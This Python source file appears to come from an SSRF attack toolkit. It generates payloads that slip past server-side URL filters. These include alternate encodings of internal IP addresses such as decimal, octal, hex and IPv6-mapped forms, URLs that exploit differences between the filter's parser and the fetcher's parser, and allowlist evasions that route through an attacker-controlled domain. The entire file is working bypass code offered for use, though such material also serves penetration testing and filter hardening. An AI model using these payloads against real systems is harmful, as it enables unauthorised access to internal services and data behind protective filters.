"""
bypass.py — SSRF filter fingerprinting + bypass candidate generator.

When a blocklist/allowlist filter stands between the input and the fetch, we
generate the well-known evasions. The idea is always the same: make the filter
*see* something safe while the fetcher *resolves/contacts* the internal target.

Families:
  * IP encoding       — decimal/octal/hex/IPv6/short forms of the target IP.
  * URL-parser confusion — the parts the filter's URL parser and the fetcher's
    parser disagree on (backslash, @, #, ?, whitespace, [ in userinfo).
  * Allowlist evasion — allowed.attacker.com, attacker#allowed, creds@, append-#.
  * (DNS rebinding is handled by core/rebind.py.)
"""

from __future__ import annotations

import ipaddress
from dataclasses import dataclass


@dataclass
class BypassCandidate:
    technique: str
    family: str
    payload: str       # the value to inject (a URL or host)


def ip_encodings(ip: str) -> list[tuple[str, str]]:
    """Alternate encodings of an IPv4 address (host part only)."""
    try:
        addr = ipaddress.IPv4Address(ip)
    except ValueError:
        return []
    n = int(addr)
    octets = str(addr).split(".")
    out = [
        ("decimal", str(n)),
        ("hex", "0x" + format(n, "08x")),
        ("hex-dotted", ".".join("0x" + format(int(o), "02x") for o in octets)),
        ("octal", ".".join("0" + format(int(o), "o") for o in octets)),
        ("ipv6-mapped", f"[::ffff:{addr}]"),
        ("ipv6-mapped-hex", f"[::ffff:{format(n, '08x')[:4]}:{format(n, '08x')[4:]}]"),
        ("mixed", f"{octets[0]}.{octets[1]}.{int(octets[2]) * 256 + int(octets[3])}"),
    ]
    if str(addr) == "127.0.0.1":
        out += [("short-127.1", "127.1"), ("zero", "0.0.0.0"), ("localhost-decimal", "2130706433")]
    return out


def parser_confusion(allowed_host: str, target: str) -> list[tuple[str, str]]:
    """URLs that exploit parser disagreement between filter and fetcher."""
    return [
        ("backslash-at", f"http://{allowed_host}\\@{target}/"),
        ("userinfo-at", f"http://{allowed_host}@{target}/"),
        ("fragment", f"http://{target}#{allowed_host}"),
        ("query", f"http://{target}?{allowed_host}"),
        ("whitespace", f"http://{target}%20{allowed_host}"),
        ("backslash-host", f"http://{target}\\.{allowed_host}/"),
        ("spring-bracket", f"http://{allowed_host}[@{target}/"),
        ("curly", f"http://{allowed_host}%ff@{target}/"),
    ]


def allowlist_evasion(allowed_host: str, attacker_host: str) -> list[tuple[str, str]]:
    """Bypasses for a host allowlist that the attacker controls a domain for."""
    return [
        ("subdomain-prefix", f"http://{allowed_host}.{attacker_host}/"),
        ("fragment-suffix", f"http://{attacker_host}#{allowed_host}"),
        ("query-suffix", f"http://{attacker_host}?{allowed_host}"),
        ("userinfo", f"http://{allowed_host}@{attacker_host}/"),
        ("backslash", f"http://{attacker_host}\\@{allowed_host}/"),
        ("append-hash", f"http://{attacker_host}#"),   # when the app suffixes the URL
        ("embedded-creds", f"http://user:pass@{attacker_host}/"),
    ]


def generate_bypasses(target: str, allowed_host: str = "trusted.example.com",
                      attacker_host: str = "") -> list[BypassCandidate]:
    """
    Build the full bypass set for an internal `target` (IP or host). If
    `attacker_host` is given (your collaborator domain), also add allowlist
    evasions that route through it.
    """
    out: list[BypassCandidate] = []
    # IP encodings (if target is an IP) -> a full URL per encoding.
    for tech, host in ip_encodings(target):
        out.append(BypassCandidate(tech, "ip-encoding", f"http://{host}/"))
    # parser confusion
    for tech, url in parser_confusion(allowed_host, target):
        out.append(BypassCandidate(tech, "parser-confusion", url))
    # allowlist evasion
    if attacker_host:
        for tech, url in allowlist_evasion(allowed_host, attacker_host):
            out.append(BypassCandidate(tech, "allowlist-evasion", url))
    return out
